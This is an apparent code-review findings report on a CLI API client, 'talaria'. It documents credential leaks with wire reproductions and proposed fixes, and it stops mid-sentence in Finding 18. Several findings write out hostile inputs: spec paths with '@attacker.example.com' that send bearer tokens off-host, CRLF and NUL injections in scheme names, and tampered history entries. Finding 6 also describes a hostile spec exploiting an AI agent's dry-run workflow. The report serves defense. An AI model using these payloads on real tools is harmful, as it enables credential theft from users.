# Review findings — phase-2a-experiment (cycle 4)

Base: `main`. Diff: `git diff main...HEAD` — 24 commits, tasks 1–6 of 21 in `tasks.json` done,
7–21 queued. Reviewers: security, spec-compliance, concurrency, integration.

**No production code has changed since cycle 3.** The only commits after `0ae3e5c` are `81b1678`
(edits `.ralph/loop.sh`) and `790747b` (deletes `REVIEW_ESCALATION.md`). Nothing under `cmd/` or
`internal/` moved. Two consequences, and both matter for how this file reads:

1. **No fix cycle has run.** Every finding carried from cycle 3 is therefore `Repeat-of: none` — a
   repeat means *a previous fix was attempted and failed*, and none was. The three exceptions are
   Findings 12, 13 and 14, which were already repeats of cycle-2 findings because `c05ba96`
   attempted those fixes and partly failed; that lineage is preserved.
2. **`Introduced-by` is unchanged in aggregate: exactly one CRIT is a branch regression** —
   Finding 1, created by `f8ef1d3` (task 5). Every other CRIT was reproduced against a binary built
   from `main` and behaves identically there.

**Three CRITs are new this cycle**, all found at the wire and none of them by the suite: Findings
2 (a spec's own `paths` key rewrites the authority and takes the credential with it), 8 (a base URL
carrying `#` or `?` silently discards the operation's path) and 9 (the emitted curl's query-string
credential is unescaped). Finding 5 gained a second limb the prior cycle missed: replay's **query**
filter is value-only just as its header filter is, so an edited entry's `?api_key=` reaches the
wire while the envelope renders `<redacted>` over it.

**Corrections to cycle 3.** Its Finding 33 claimed three stale `TRACKED DEBT (phase-2a task 1)`
waivers in `.golangci.yml`; there is one, and it is still load-bearing — removing it makes
`contextcheck` fire at `cmd/talaria/root.go:320`. The real stale-waiver problem is elsewhere and is
Finding 40 here. Its Finding 11 is downgraded to INFO (Finding 38): the doubled sentence changes
neither the exit code nor `valid_alternatives`, so nothing branches on it. Its Findings 27 and 10
are one defect and are merged into Finding 15.

**Verified sound — do not re-litigate.** `SecretRef` discipline holds: `.Resolve()` has exactly two
non-test call sites, both inside `internal/curl`, and the type has no field that can hold a value.
No credential is ever an argv element; `-q` is first, so a planted `~/.curlrc` cannot add
`trace-ascii` or `proxy`. Redirects are not followed at all (`proto-redir` set, `location` never),
so a 302 cannot carry the credential off-host. curl's own error text is scrubbed of both the
resolved value and its percent-encoded form. `canonicalHost` normalises case, default port, trailing
root dot and IPv6 brackets and nothing else — `api.example.com.attacker.com` is correctly not a
match, and `HostSet.Allows` is the only comparison in the tree. A hostile spec cannot choose which
environment variable is read. The spec cache is sha256-named under 0700 with 0600 files, written
temp-then-rename; no traversal. DESIGN.md §5's oauth2/openIdConnect/mutualTLS matrix matches row for
row, including the bring-your-own-token clause. Basic auth stays symbolic and does not prompt.
Server-variable substitution is single-pass and bounded at `maxServerURL`. The `call → history →
replay → wire` round trip is byte-identical for a path parameter, a declared header parameter, a
binary body, an unusual media type and a percent-encoded parameter. A hand-edited stored host is
refused at exit 2 and the attacker listener receives nothing. `replayableEnv` is absent from the
tree. Every warning goes through `clierr.Warnf`; one `invocation` per RunE.

**The concurrency reviewer found nothing above INFO**, and this time re-derived the claims rather
than carrying them. `go test -race -count=1 ./...` is clean across all 15 packages. Production code
contains no `go func` at all — two `sync.Once`s and nothing else — so there is no goroutine to leak.
40 concurrent appends against one store produced 40 distinct well-formed entries; trim under
contention (12 appenders, 12 readers, 1050 seeded entries) left exactly 1000 lines with every
concurrent append present and no torn reads. 30 concurrent processes into one empty spec cache left
one correct file and no temps. SIGINT and SIGTERM mid-request leave no orphan curl, no 0600 body
temp file and no capture directory.

**Build, lint and suite are green** — `go build ./...`, `gofmt -l`, `go vet ./...`,
`golangci-lint run ./...` (0 issues), `go test ./...` (15 packages), `go test -race`. Per CLAUDE.md
that is evidence of nothing: every finding below was found by a listener or by reading.

---

## Finding 1: The emitted `--dry-run` curl for a `@file` or stdin body sends different bytes than talaria itself sends

- **Reviewer:** security, integration, spec-compliance
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `f8ef1d3` (task 5)
- **Repeat-of:** none
- **File:** internal/curl/render.go:165
- **Description:** **The one CRIT this branch created.** DESIGN.md:158 states "`--dry-run` prints the
  exact curl command." `bodyArgs` emits `--data '@path'` for `request.BodyFile` and `--data '@-'`
  for `BodyStdin`, while the executor sends the bytes verbatim via `data-raw` or
  `data-binary @tmp` (`internal/curl/config.go:305`, `:316`). **`curl --data @file` strips every
  newline and carriage return from the file** — `internal/curl/config.go:314` already documents
  exactly this as the reason the executor refuses `data`. Reproduced at the wire on both limbs
  against curl 8.14.1:
  ```
  talaria call --body @body.json      Content-Length: 36   {\n  "name": "rex",\n  "sig": "abc"\n}\n
  the emitted curl, pasted            Content-Length: 32   {  "name": "rex",  "sig": "abc"}
  talaria call --body -               Content-Length: 12
  the emitted curl, pasted            Content-Length: 9
  ```
  `main` emitted `--data-raw` inline for every body and was byte-identical
  (`git show main:internal/curl/render.go:133`). A signed payload, NDJSON or anything
  whitespace-significant reproduces as a *different request*, silently, and the agent that pasted
  the command cannot tell. The team recorded the divergence honestly in `AGENT.md:172-174`, in
  `.ralph/refactor-backlog.md` and in a pinning test — but AGENT.md and DESIGN.md v0.5 now
  contradict each other with no design-doc amendment, and documenting a silent divergence
  elsewhere does not make it detectable at the call site.
- **Suggested fix:** Emit `--data-binary` for both `BodyFile` and `BodyStdin`. It is still a
  *reference* — §3.4's actual requirement is that the bytes are not printed, which
  `--data-binary @path` satisfies identically — and it converges with what the executor already
  does. Amend DESIGN.md §3.4:163 (which spells this `--data @file`) in the same commit, per
  CLAUDE.md's rule that a contract change is never silent, and drop the backlog entry.
  **Note for the fixer:** `internal/curl/render_test.go`'s `TestRenderReferencesABodyTheReaderWasNeverShown`
  and `internal/e2e/e2e_test.go:643`'s `TestAPreviewedFileBodyLosesTheNewlinesTheCallSends` both
  pin the defect in and must change with the fix. Add a canary case that executes the request,
  executes the emitted curl, and asserts the two captured bodies are equal.

## Finding 2: An operation path that does not begin with `/` sends the resolved credential to a host of the spec's choosing, and nothing is withheld

- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — the leak reproduces on a binary built from `main`, which had no host
  binding at all; the hole in the *new control* is this branch's to close, as with Finding 4
- **Repeat-of:** none
- **File:** internal/request/build.go:546
- **Description:** **New this cycle.** The host-binding check tests `req.BaseURL`, but the request
  goes to `req.BaseURL + req.Path` (`internal/request/request.go:323`). `req.Path` comes from the
  spec's `paths` map key and is validated only for leftover `{}` placeholders
  (`internal/request/build.go:271`) — never for a leading `/`. A hostile spec declares a legitimate
  server, so `AllowedHosts` is satisfied, then names its path so that concatenation rewrites the
  authority. Reproduced independently at the wire, twice:
  ```
  servers: [{"url":"http://127.0.0.1"}]         # port 80 is the ONLY allowed host
  paths:   {"@127.0.0.1:42999/steal": {...}}    # everything before @ becomes userinfo

  envelope: "url":"http://127.0.0.1@127.0.0.1:42999/steal"   credentials_withheld: null
  stderr:   (empty)                                          exit 0
  wire on :42999:  GET /steal HTTP/1.1
                   Host: 127.0.0.1:42999
                   Authorization: Bearer CANARY-BEARER-999
  ```
  The port trick (`paths: {":42823/steal": ...}`) works the same way. Generalised: with
  `servers: [https://api.example.com]` and a path of `@attacker.example.com/x`, the production
  bearer token is delivered to a host the attacker controls, DNS and all, while every surface
  talaria prints reads as the declared host. `--allow-host` and profile `allow_hosts:` are
  irrelevant because nothing is checked. This defeats DESIGN.md §5a's "Credentials bind to hosts"
  invariant completely, using nothing but the spec — the input §1 promises is safe to point the
  tool at.
- **Suggested fix:** Two changes, and each alone is incomplete. (1) In `binder.path`, refuse an
  `op.Path` that does not begin with `/` or that contains `?`, `#` or `@` — a spec path is a path,
  not a URL fragment. A path key of `/thing?injected=1` is also reachable and produces
  `.../thing?injected=1?q=hi` on the wire. (2) Run the host check on the *assembled* URL rather
  than on `BaseURL`, so any future path-shaped input is covered by the check itself rather than by
  a second predicate that can drift out of step with it. Add a hostile-path fixture to
  `internal/canary` asserting the canary never reaches a second listener.

## Finding 3: A NUL byte in a spec-supplied value deletes the next directive from the curl config document, including the credential

- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — reproduces byte-identically on `main`, whose `checkSplit` is the same
- **Repeat-of:** none
- **File:** internal/curl/config.go:274
- **Description:** Carried from cycle 3 finding 2, re-verified at HEAD. `checkSplit` and
  `request.SplitsRequest` (`internal/request/build.go:480`) test only `\r` and `\n`;
  `escapeDirective` (`internal/curl/config.go:423`) has no escape for NUL. A
  `securitySchemes.<x>.name` containing a NUL — bound at `internal/request/build.go:557` with no
  name check at all — reaches curl's config parser verbatim, truncates the quoted value at the
  C-string boundary and consumes the rest of that directive line and the following one:
  ```
  stdout: "headers":{"Authorization":"Bearer <redacted:env:TALARIA_AUTH_BEARER>",
                     "X-Key junk":"<redacted:env:TALARIA_AUTH_APIKEY_EVIL>"}
          "response":{"status":200}          exit 0, stderr EMPTY
  wire:   GET /thing HTTP/1.1 / Host: ... / User-Agent: curl/8.14.1 / Accept: */*
          (ZERO auth headers sent)
  ```
  A silent downgrade to unauthenticated. The envelope, the emitted curl and the history entry all
  assert two headers went out; none did, and the caller has no signal to branch on.
- **Suggested fix:** Widen the wire-safety predicate to reject any rune `< 0x20` or `== 0x7f` in
  both `request.SplitsRequest` and `curl.checkSplit`, and apply it on all three surfaces CLAUDE.md
  names. Add a NUL-in-scheme-name case to `internal/canary` — the existing canary set has no case
  where the credential is *dropped*, only cases where it is printed.

## Finding 4: A profile-supplied credential is sent to any host, while stderr and the envelope claim a different credential was protected

- **Reviewer:** security, spec-compliance
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — no host binding existed on `main`, so the leak predates the branch;
  the false reassurance does not, and `d1548bf` added it
- **Repeat-of:** none
- **File:** internal/request/build.go:548
- **Description:** Carried from cycle 3 finding 6, re-verified at HEAD by two reviewers
  independently. `binder.credentials` populates `req.Withheld` from `b.in.Creds` only. A profile
  `headers:` value that talaria itself classifies as a credential — `hide()`
  (`internal/request/build.go:388`) marks it sensitive and every display surface prints
  `<redacted>` — is never considered by the host check:
  ```
  stderr: warning: bearerAuth withheld from 127.0.0.1:33307: it is not a host the spec declares
  stdout: "headers":{"X-Api-Token":"<redacted>"},
          "credentials_withheld":[{"scheme":"bearerAuth","reason":"host not in spec servers[]",...}]
  wire:   Authorization: Bearer PROFILE_SECRET_TOKEN
          X-Api-Key: PROFILE_APIKEY
  ```
  CLAUDE.md: *"Redaction answers does it print; it does not answer who receives it."* Here
  redaction answered and host binding did not — and the operator is affirmatively told the boundary
  held. That false reassurance is what makes this CRIT rather than a missing check. This is exactly
  the threat model §1 describes: the human put the secret in the 0600 profile, the agent never saw
  it, and the agent chooses `--base-url`.
- **Suggested fix:** Withhold on `Value.IsSensitive()` rather than on membership of `b.in.Creds`,
  so every value talaria treats as a credential is bound to the host set by one rule. `Withheld`
  needs a second form for a value classified by name rather than by scheme, and
  `warnWithheldCredentials` (`cmd/talaria/call.go:294`) must render both.
  **Scope note:** DESIGN.md §5a's "every credential is withheld" plus §5's listing of profiles as a
  credential source settles the profile limb, which is the leak demonstrated above — fix that. It
  does *not* settle whether a `--header Authorization=...` typed on the command line for that very
  call also counts, since a flag is the caller's per-call choice and a profile is not. Leave the
  flag limb alone and record the question in DESIGN.md §5a rather than deciding it here.

## Finding 5: A stored history header supplies the credential a replayed request authenticates with, and the query limb does the same invisibly

- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — reproduces on `main`, where the stored URL and headers were re-sent
  directly
- **Repeat-of:** none
- **File:** internal/replay/replay.go:307
- **Description:** Carried from cycle 3 finding 4, re-verified at HEAD, **plus a second limb the
  prior cycle did not record**. `Inputs.headers` forwards every recorded header as a `--header`
  flag, filtered only by `isRedacted` — i.e. only by *value*, never by name. A hand-edited entry
  therefore decides which credential authenticates the replay:
  ```
  wire: Authorization: Bearer ATTACKER-TOKEN     <- from the file, first, so it wins
        X-Whatever: injected
        Authorization: Bearer CANARY-REAL-333    <- from config.Resolve
  exit 0
  ```
  **The query limb is worse and is new.** `Inputs.query` (`internal/replay/replay.go:256`, `:273`)
  applies the identical value-only filter, so an entry whose stored URL reads
  `?api_key=ATTACKER-QUERY-KEY` puts that value on the wire while `hide()` renders it
  `<redacted>` in the replay envelope and in `history show`:
  ```
  stdout: "url":"http://127.0.0.1:42823/thing?api_key=<redacted>"
  wire:   POST /thing?api_key=ATTACKER-QUERY-KEY HTTP/1.1
  ```
  The redaction machinery actively conceals the second limb. DESIGN.md §5a's replay table, row 2:
  *"Credentials — Never taken from the entry."* CLAUDE.md: *"a stored credential position is
  dropped, not read."* Both violated, on two surfaces.
- **Suggested fix:** Drop any recorded header **or query parameter** whose *name* is
  credential-shaped by the same `secret` rule `hide()` uses, and `warnUnreplayable` on it, so a
  stored credential position is dropped by name and not merely by value. A name-based drop is the
  only rule that works: the value the store wrote is a placeholder, but the value an attacker
  writes is not. The broader which-headers-may-replay-at-all question is Finding 25 and is blocked
  on design; this limb is not — §5a already answers it for credentials.

## Finding 6: A spec's `securitySchemes.name` reaches the emitted curl unchecked, and the pasted command delivers the real credential into an injected header

- **Reviewer:** security
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — reproduces on `main`; `binder.credentials` never checked `cred.Name`
  there either
- **Repeat-of:** none
- **File:** internal/request/build.go:557
- **Description:** Carried from cycle 3 finding 5, re-verified at HEAD, **and the impact is worse
  than the prior cycle recorded**. `binder.located` runs `isFieldName` and `SplitsRequest` on a
  declared header parameter's name (`internal/request/build.go:316`, `:322`); `binder.credentials`
  runs neither on `cred.Name`, which `config.credentialFor` (`internal/config/auth.go:380`) copies
  straight out of `scheme.Name`. `curl.Render` guards only `Body.ContentType`
  (`internal/curl/render.go:50`), so the two surfaces disagree:
  ```
  header scheme, --dry-run:  "curl":"curl -q -s -H \"X-Key: v\r\nX-Injected: pwned: $TALARIA_AUTH_APIKEY_EVIL\" ..."  exit 0
  header scheme, real call:  {"code":2,"message":"header ... carries a carriage return..."}                            exit 2
  cookie scheme, --dry-run:  "curl":"curl -q -s -b \"sid=x\r\nX-Injected: pwned=$TALARIA_AUTH_APIKEY_EVIL\" ..."       exit 0
  cookie scheme, real call:  {"code":2,"message":"cookie ... carries a carriage return..."}                            exit 2
  ```
  The reviewer then **ran** the emitted command and captured the wire. The literal CRLF survives
  shell double-quoting (`word.String` escapes only backslash, quote, backtick and `$`), so the
  credential is delivered under a header name the *spec author* chose:
  ```
  X-Key: v
  X-Injected: pwned: CANARY-APIKEY-222      <- resolved credential, attacker-named header
  ```
  This is not merely "dry-run disagrees with call". A hostile spec turns `--dry-run` into a
  credential-exfiltration primitive against any agent following AGENT.md's
  list→describe→dry-run→call workflow, because `--dry-run` reaches `Render` without ever building
  a config document. CLAUDE.md's three-surface rule, failing at two of three.
- **Suggested fix:** Apply `isFieldName` and the widened `SplitsRequest` (per Finding 3) to
  `cred.Name` in `binder.credentials` — one place covers header, cookie and query — and have
  `curl.Render` return `""` for a request carrying a splitting header *or cookie* name, as it
  already does for `Body.ContentType`. Note Finding 27: an empty `request.curl` is itself an
  unhandled condition.

## Finding 7: `--body @file` publishes the file's bytes to stdout and into the permanent history store

- **Reviewer:** security, spec-compliance, integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — the `request.body` field predates the branch; `f8ef1d3` (task 5)
  fixed only the `curl.Render` half
- **Repeat-of:** none
- **File:** cmd/talaria/call.go:447
- **Description:** Carried from cycle 3 finding 3, re-verified at HEAD with a key deliberately
  chosen *outside* `builtinBodyPaths`. CLAUDE.md states the two rules explicitly and that *"each
  one alone still leaks."* Only one landed. `curl.Render` correctly references the file;
  `view.Request.Body` immediately after prints it in full, redacted only through the three
  `builtinBodyPaths` (`access_token`/`refresh_token`/`id_token`):
  ```
  $ talaria call post.json makeThing --allow-mutations --dry-run --body @sec.json
  "curl":"... --data '@sec.json' ..."                                     <- §3.4 honoured
  "body":"{\"client_secret\":\"SECRET-CANARY-98765\",\"password\":\"hunter2\"}\n"
  $ grep -c SECRET-CANARY-98765 history.jsonl
  1
  ```
  `client_secret` is the canonical OAuth2 client-credentials secret and is not in the built-in
  list. Arbitrary local file contents cross into the agent's channel via a path the agent itself
  supplied, and the same bytes land verbatim in the store — which §5a calls "the highest-risk
  surface in the tool".
- **Suggested fix:** For `BodyFile` and `BodyStdin`, have `callPayload`'s `request.body` carry the
  same `@path` / `@-` reference `request.curl` does, and have `corpus.Redactors` store the
  reference rather than the bytes. This is §3.4's own reasoning applied consistently — the agent
  supplied the path, not the bytes, so it loses nothing. Extending `builtinBodyPaths` instead is
  the weaker option: the list can never be complete, which is the property that produced this
  finding. Record the decision in DESIGN.md §3.4 alongside Finding 1's amendment, and fix the
  canary (Finding 30) in the same commit or this stays untested.

## Finding 8: A base URL carrying a fragment or a query string silently discards the operation's path, and the credential still goes out

- **Reviewer:** integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — reproduces identically on a `main`-built binary;
  `git blame -L 176,186 internal/request/build.go` shows the check is from the initial commit
- **Repeat-of:** none
- **File:** internal/request/build.go:183
- **Description:** **New this cycle.** `ResolveBaseURL` validates userinfo, scheme and host, then
  returns the string with only a trailing `/` trimmed. `Request.URL` is
  `BaseURL + Path + "?" + query` — pure concatenation. A base URL with a `#` or a `?` therefore
  swallows the operation's path. Reproduced independently at the wire:
  ```
  --base-url 'http://127.0.0.1:42999/v1#frag'   spec path /pets/{petId}, petId=42
    envelope: "url":"http://127.0.0.1:42999/v1#frag/pets/42"   credentials_withheld: null
    stderr:   (empty)                                          exit 0
    wire:     GET /v1 HTTP/1.1
              Authorization: Bearer CANARY-FRAG
  --base-url 'http://127.0.0.1:42999/v1?x=1'
    wire:     GET /v1?x=1/pets/42 HTTP/1.1      <- the path is now query text
  ```
  The request went to an endpoint the caller never named, the bearer token went with it, and every
  surface talaria prints reports the URL it did *not* send. It is also reachable from the spec,
  which CLAUDE.md names as untrusted input: `servers: [{url: "http://127.0.0.1:42999/v1#"}]` with
  no `--base-url` at all produces the same result. `internal/spec/servers.go:29`'s doc comment
  states that `binder.baseURL` applies the same checks to a substituted server as to a hand-typed
  `--base-url` — true, and those checks do not cover this. One spec-controlled byte redirects every
  call in the document to one path while the output insists otherwise.
- **Suggested fix:** In `ResolveBaseURL`, reject a candidate whose parsed `RawQuery` or `Fragment`
  is non-empty, with the same exit-2 shape as the other refusals. That one seam covers
  `--base-url`, the profile and `spec.Servers` together. Add a `servers[].url` fixture with a `#`
  to `internal/spec/servers_test.go` and a `--base-url` case with a `?` to
  `internal/request/hosts_test.go`.

## Finding 9: A query-string credential is emitted unescaped in `request.curl`, so the pasted command sends a different key and can inject extra parameters

- **Reviewer:** integration
- **Severity:** CRIT
- **Blocked-by:** none
- **Introduced-by:** `none` — reproduces byte-identically on `main`;
  `git blame -L 191,214 internal/curl/render.go` is entirely the initial commit and
  `git diff main...HEAD -- internal/curl/render.go` does not touch `urlWord`
- **Repeat-of:** none
- **File:** internal/curl/render.go:207
- **Description:** **New this cycle.** Reported although `urlWord`'s own lines are untouched:
  `render.go` is in the diff, this is the same DESIGN.md §3.4 contract Finding 1 breaks, and a fix
  cycle that converges only the body path will leave it. `Request.QueryString`
  (`internal/request/request.go:358`) percent-encodes a *resolved* credential before it goes on the
  wire, deliberately. `urlWord` does not: for any `IsSensitive()` value it writes `render(q.Value)`
  straight into the word with no `url.QueryEscape`, because the comment at
  `internal/curl/render.go:201-205` assumes the rendered text is only ever a display placeholder.
  For a `SecretRef` it is `$TALARIA_AUTH_APIKEY_QUERYKEY`, and the shell expands it to the *raw*
  value at paste time. With `TALARIA_AUTH_APIKEY_QUERYKEY='ab+cd/ef==&injected=1'`:
  ```
  emitted:  curl -q -s "http://127.0.0.1:18999/thing?api_key=$TALARIA_AUTH_APIKEY_QUERYKEY"
  talaria's own wire:   GET /thing?api_key=ab%2Bcd%2Fef%3D%3D%26injected%3D1 HTTP/1.1
  emitted curl's wire:  GET /thing?api_key=ab+cd/ef==&injected=1              HTTP/1.1
  ```
  Two divergences, both silent at exit 0. `+` decodes server-side as a space, so a base64 key —
  which routinely contains `+`, `/` and `=` — is mangled and the reproduction authenticates with a
  different value. And `&` in the value splits it into **a second query parameter talaria never
  sent**.
- **Suggested fix:** Do not put a raw `$VAR` in the query string. For the common GET case emit
  `-G --data-urlencode "api_key=$TALARIA_AUTH_APIKEY_QUERYKEY"`, which is symbolic, encodes at
  curl's end, and needs no change to the curl floor. A request with *both* a body and a query
  credential cannot use `-G`; either use `--url-query` (curl >= 7.87 — a floor bump DESIGN.md §3.4
  would have to record) or have `Render` return `""` for that shape and handle the empty result the
  way Finding 27 asks. Add a canary case asserting the two received query strings are equal.

---

## Finding 10: `history replay` reorders the query string, and the fix that claimed to preserve order asserts in a comment that it does

- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2) — `main` re-sent the stored URL and preserved order exactly
- **Repeat-of:** cycle 2 finding 1
- **File:** internal/replay/replay.go:267
- **Description:** Carried from cycle 3 finding 7 and re-verified at the wire. `c05ba96` claimed to
  fix value loss and ordering; it fixed value loss only, and the comment it left behind asserts
  the ordering property it does not have. Declared parameters are hoisted ahead of undeclared ones:
  ```
  call --query 'a=b=c' --query 'weird&name=v' --query normal=ok
    wire  ?a=b%3Dc&weird%26name=v&normal=ok
  history replay 1
    wire  ?normal=ok&a=b%3Dc&weird%26name=v      exit 0, stderr empty
  ```
  Order is semantically significant for signed URLs and for APIs that read the first occurrence of
  a repeated key. The earlier fix approach — patching the value path and describing the result in
  prose — is what failed; re-applying it will fail again.
- **Suggested fix:** Preserve the recorded pair order verbatim instead of rebuilding declared-first,
  and replace the comment with a test that asserts the replayed query string equals the recorded
  one byte for byte.

## Finding 11: An entry talaria itself just wrote is unreplayable at exit 2, naming a flag `history replay` does not have

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** cycle 2 finding 7
- **File:** internal/replay/replay.go:293
- **Description:** Carried from cycle 3 finding 8. `c05ba96` claimed this and fixed the header limb
  only. The refusal message directs the caller to a flag the command does not register
  (`cmd/talaria/history.go:246` registers only `--allow-mutations`), so the advice is unfollowable.
- **Suggested fix:** Name a flag that exists, or register the one the message assumes. Add a test
  that round-trips an entry talaria itself wrote and asserts exit 0.

## Finding 12: The declared-cookie branch `c05ba96` added is unreachable from any entry talaria writes, and its test uses an entry shape the store cannot produce

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `c05ba96`
- **Repeat-of:** cycle 2 finding 7
- **File:** internal/replay/replay.go:316
- **Description:** Carried from cycle 3 finding 9. The branch added to handle a declared cookie on
  replay cannot be reached from any entry `corpus` writes; the accompanying test constructs an
  entry shape by hand that the store never produces, so it passes without exercising the path.
  This is the second limb of the same failed fix as Finding 11.
- **Suggested fix:** Either write the entry shape the store actually produces and make the branch
  reachable, or delete the branch and its test. A test that constructs an impossible input is worse
  than no test — it reports coverage that does not exist.

## Finding 13: `auth check` exits 2 with no report at all for a spec whose `servers[]` is relative, and `firstServer`'s comment claims otherwise

- **Reviewer:** spec-compliance, security
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `c05ba96` — its own commit message says `request.Target` "swallowed every
  `ResolveBaseURL` error rather than only the 'nothing named a base URL' case"; it then tightened
  past the case it was fixing. `d1548bf` added `Target`
- **Repeat-of:** none
- **File:** internal/request/hosts.go:114
- **Description:** Carried from cycle 3 findings 10 and 27, which are one defect and are merged
  here. `credentialsWithheld` (`cmd/talaria/auth.go:118`) calls `request.Target`, which converts
  only `ErrNoBaseURL` into "no target" and returns every other failure. Relative `servers[].url`
  values (`/v1`, `/`) are extremely common, especially in Swagger 2.0 conversions carrying only a
  `basePath`. Built binaries from both trees, same fixture:
  ```
  main:    talaria auth check rel.yaml --output json -> {"schema":"talaria/v1","schemes":[]}  exit 0
  branch:  talaria auth check rel.yaml --output json -> code 2: base URL "/v1" from the spec's
           servers[0].url is not an absolute http(s) URL                                     exit 2
  ```
  The report is not printed at all, contradicting `newAuthCheckCmd`'s own stated contract
  (`cmd/talaria/auth.go:97-99`: "Failing first would leave an agent a code 5 and nothing to read").
  DESIGN.md §4 describes `auth check` as a question about the environment, which does not require a
  resolvable target. **Second limb:** `ResolveBaseURL`'s doc comment
  (`internal/request/build.go:148-149`) states "A spec whose server URL is relative ... counts as no
  server," which the code does not do — `firstServer` returns `spec.Servers(doc)[0]`
  unconditionally, so with `servers: [{url: /v1}, {url: https://ok.example.com}]` the usable second
  server is never reached. `AllowedHosts` already drops hostless URLs, so the two readers of
  `spec.Servers` disagree about the same list. Per CLAUDE.md, that comment is a claim no test
  enforces.
- **Suggested fix:** Make `firstServer` skip URLs `hostOf` cannot resolve, so a relative server
  really does "count as no server" and the next absolute one wins — one change fixes both limbs and
  brings `firstServer` in line with `AllowedHosts`. Add a test asserting the second server is
  chosen, and one asserting `auth check` on a relative-only spec still prints its report.

## Finding 14: A media type `call` refuses at bind time is put on the wire by `history replay`

- **Reviewer:** security
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `e47176c` (task 4)
- **Repeat-of:** none
- **File:** internal/replay/replay.go:226
- **Description:** Carried from cycle 3 finding 12, re-verified at the wire. Task 4's three surfaces
  do not apply the same predicate: bind time uses `isMediaType`
  (`internal/request/body.go:189` — type/subtype tokens, no control characters in parameters),
  while the config document (`internal/curl/config.go:293`) and `curl.Render`
  (`internal/curl/render.go:50`) use only `request.SplitsRequest`, i.e. CR/LF. `replay.body()`
  sets `Body.ContentType` straight from the stored entry and never reaches `binder.contentType`:
  ```
  entry edited: "content_type": "application/jsonevil"
  wire: Content-Type: application/json<VT>evil        exit 0, no warning
  ```
  A vertical tab in a header value is where request-smuggling differentials between a proxy and an
  origin live. CLAUDE.md's worked example says *"Three surfaces, one value"*; this is three
  surfaces, two values, in the paragraph the branch itself wrote. Distinct from Finding 3:
  widening `checkSplit` to reject control runes still admits `NOT A MEDIA TYPE `.
- **Suggested fix:** Export `isMediaType` from `internal/request` and apply it in `checkSplit`'s
  Content-Type branch and in `curl.Render`'s guard, so an entry-sourced value is held to the same
  predicate as a spec-sourced one.

## Finding 15: Replay drops a path parameter's recorded value when the operation declares the same name in two locations

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2) — `main` re-sent the stored URL and was correct
- **Repeat-of:** none
- **File:** internal/replay/replay.go:97
- **Description:** Carried from cycle 3 finding 13. When an operation declares the same parameter
  name in two locations (say `id` in both `path` and `query`), the re-derivation loses the recorded
  path value, so the replayed request targets a different resource than the one recorded. Silent.
- **Suggested fix:** Key the recorded parameter values by (name, location) rather than by name
  alone, and fail that entry loudly rather than dropping a value if the pair cannot be resolved.

## Finding 16: `history replay` silently retargets a recorded call at a different declared server, with the credential, while its comment says it refuses to

- **Reviewer:** spec-compliance
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2) — `main` re-sent the stored URL and could not retarget
- **Repeat-of:** none
- **File:** internal/replay/replay.go:188
- **Description:** Carried from cycle 3 finding 14. A recorded call against one declared server is
  replayed against a different declared server, with the credential, and nothing warns — while the
  code's own comment states it refuses to retarget. DESIGN.md:407 says a stored host outside the
  currently allowed set is refused at exit 2; a stored host inside the set but *different from the
  resolved target* is the case neither the doc's words nor the code's comment describe accurately.
  One reviewer noted `replay.target` (`internal/replay/replay.go:180`) returns early when the
  stored host *equals* the resolved target, which is a defensible reading of "refuse retargeting,
  not agreement" — that early return is not the finding; the silent retarget when they differ is.
- **Suggested fix:** Warn through `clierr.Warnf` when the resolved target differs from the recorded
  host, naming both, and correct the comment to describe what the code does.

## Finding 17: The replay warning about a dropped credential states the opposite of what happens, on all three limbs

- **Reviewer:** spec-compliance, integration
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `d1548bf` (task 2)
- **Repeat-of:** none
- **File:** internal/replay/replay.go:417
- **Description:** Carried from cycle 3 finding 15, re-verified at the wire this cycle. The warning
  says the recorded credential position is being replayed *without* the credential; the credential
  is then re-resolved and sent:
  ```
  warning: the recorded query parameter "api_key" held a redacted value, which history does not
           store; replaying without it
  wire:    GET /thing?api_key=KEYVAL HTTP/1.1
  ```
  A warning that contradicts the wire is worse than no warning: an operator reading it concludes
  the request went out unauthenticated.
- **Suggested fix:** Say what happens — the stored placeholder was dropped and the credential was
  re-resolved from the environment. Assert the wording against a wire capture in the test, not
  against the string alone.

## Finding 18: `history replay` puts a resolved API key in the query string without the one-time warning `call` fires for the same request

- **Reviewer:** integration
- **Severity:** WARN
- **Blocked-by:** none
- **Introduced-by:** `none` — `main`'s `history replay` also emits no such warning; verified by
  running a `main`-built binary, which sent `?api_key=KEYVAL` with an empty stderr
- **Repeat-of:** none
- **File:** cmd/talaria/history.go:227
- **Description:** DESIGN.md §5a's leak-channel table requires, for query-string API keys, that
  talaria "warn once on stderr", because the key lands in server access logs whatever redaction
  does. `cmd/talaria/call.go:158` does this via `warnQueryCredentials`. The replay RunE calls
  `warnWithheldCredentials` on the line beside it and never the query warner — but `replay.Build`
  re-resolves the credential through `config.Resolve` and `request.Build` puts it in exactly the
  same place. So on a replay the required warning is absent, and the only warning that does fire
  about that parameter is Finding 17's, which says the opposite of what the wire shows.
- **Suggested fix:** Build the `secret.NewQueryKeyWarner` in `newHistoryReplayCmd` the way
  `newCallCmd` does and call `warnQueryCredentials` beside `warnWithheldCredentials`. Better: hoist
  both onto a single `warnRequest(stderr, warner, req)` helper called by every command that sends a
  `*request.Request`, so a future sender inherits both — the same shape as `hostFlags(cmd)` in
